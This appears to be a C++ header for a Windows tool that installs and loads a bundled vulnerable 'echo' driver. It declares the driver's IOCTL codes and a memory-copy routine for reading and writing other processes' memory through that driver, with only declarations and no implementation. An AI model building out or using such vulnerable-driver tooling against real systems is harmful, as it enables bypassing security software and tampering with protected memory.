#pragma once
#include "vul_driver.h"
#include "echo_driver_resource.h"
#include "utils.h"
#include <Windows.h>
#include <filesystem>
#include <iostream>
#include <fstream>

#pragma comment(lib, "ntdll.lib")

constexpr auto SE_LOAD_DRIVER_PRIVILEGE = 10L;
#define SERVICE_PATH_COMMON std::wstring(L"SYSTEM\\CurrentControlSet\\Services\\")
constexpr auto VUL_DRIVER_INITIALISE_IOCTL = 0x9e6a0594;
constexpr auto VUL_DRIVER_COPY_IOCTL = 0x60A26124;

class vul_driver
{
  std::wstring driver_name;
  std::wstring device_name;

  auto get_full_driver_path() const -> std::wstring;

public:
  HANDLE h_device = INVALID_HANDLE_VALUE;

  vul_driver(std::wstring name, std::wstring device_name)
    : driver_name(std::move(name)), device_name(std::move(device_name))
  {
  }

  auto initialize_driver() const -> BOOL;
  auto mm_copy_virtual_memory() -> BOOL;
  auto get_device_handle() -> BOOL;

  auto load() const -> BOOL;
  auto install() const -> BOOL;
  auto setup_reg_key() const -> BOOL;

  // cleanup functions
  auto uninstall() const -> BOOL;
  auto delete_reg_key() const -> BOOL;
  auto unload() const -> BOOL;
};
